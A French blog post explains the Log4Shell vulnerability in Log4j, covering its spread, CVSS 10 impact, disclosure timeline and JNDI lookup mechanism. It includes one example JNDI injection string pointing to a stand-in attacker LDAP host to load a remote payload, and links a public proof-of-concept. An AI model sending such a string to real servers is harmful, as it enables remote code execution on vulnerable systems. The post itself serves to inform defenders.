# Log4J, Log4Shell, LogJam mais kesako ?

On en entend parlé partout.
Sur twiter, sur linkedin, sur les blogs et forums de securité, la faille Log4J ( [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) / [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) pour les intimes ) !

## Alors qu'est ce que log4j et qui est ciblé cette faille.

Log4J est le diminutif de "logging for java", il s'agit d'un outil de journalisation pour les progammes informatiques écrits en java.
C'est l'outil le plus courrement utilisé pour ce besoin, la plus part des programmes java l'utilise et c'est justement la popularité de cet outil, qui fait trembler internet ces derniers jours..
On le retrouve PARTOUT !! Apple, Amazon, IBM, Cloudflare, Twitter, Steam, Minecraft et [bien d'autre..](https://github.com/NCSC-NL/log4shell)

## Quels sont les impactes de cette faille ?

La faille log4j et l'une des plus grosse faille de sécurité découverte cette derniére décénie. Le score de criticité de celle ci est au plus haut (CVSS 10/10) et permet une compromission complete de la machine cible.

Elle permet une [RCE ( Remote Code Execution )](https://en.wikipedia.org/wiki/Arbitrary_code_execution) c'est à dire, l'execution de code, souvent malicieux, à distance.
Oui oui, sans authentification, sans mot de passe, juste avec un message dans un chat (ou n'importe quelle entrée utilisateur, comme un champs dans un formulaire), on demande au serveur, d'executer du code.


## Comment en est on arrivé la ?

Le jeudi 9 décembre, la faille a été publiée sur internet, [aux yeux de tous](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)
Sans laisser le temps aux développers de log4j de préparer la publication d'un patch de correction..

Le vendredi 10 décembre, la CVE est déclarée: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
Un premier patch de correction de log4j est publié, mais la correction est incompléte et l'exploit toujours faisable.
Un second patch de correction est publié pour corriger la faille, mais il ne faudra que quelque jours aux pirates pour la déjouer,
ce qui donne lieux le 14 décembre à une nouvelle cve (CVE-2021-45046)

Rapidement, une nouvelle version de log4j sort (2.16.0) et doit fixer de maniére définitive ces deux CVE.

D'aprés Matthew Prince, CEO de Cloudflare, la premiere tentative d'exploitation de cette faille sur leurs infrastructures date du [1er décembre a 4:36:50 UTC](https://twitter.com/eastdakota/status/1469800951351427073) soit 9 jours avant que la CVE soit déclarée. Les recherches de possible compromission doivent donc étre ciblé a partie de cette date.

Le vecteur d'attaque qui a été utilisé (la methode), ne date pas de décembre 2021
[Des conferences en 2013 et 2016 lors de la blackhat US](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) avait déja mis en lumiére ce vecteur d'attaque.
Mais personne ne l'avait testé sur log4j...

## Mais alors concrétement, comment ça marche ?

La faille réside dans l'implémentation du module "Java Naming and Directory Interface" de log4j.
Ce module permet de charger dynamiquement du code distant via plusieurs protocol comme ldap, rmi, dns, etc..

Lorsque log4j va vouloir journaliser une donnée utilisateur (un message dans un chat, un champ dans un formulaire, ..) plutot que prendre la donnée au format texte pour la journaliser, log4j va l'interpreter en language java résultant de la faille de sécurité.

Il est donc possible, de préparer un message spécifique pour injecter du code malveillant.
Par example, la commande suivante dans le chat du jeux minecraft, va connecter toute les personnes au serveur ldap "attackerserver.com" puis executer la fonction java "ExploitPayload"
```bash
${jndi:ldap://attackerserver.com:1389/ExploitPayload}
```

![](https://www.stormshield.com/wp-content/uploads/log4shell-1-1024x410.png)
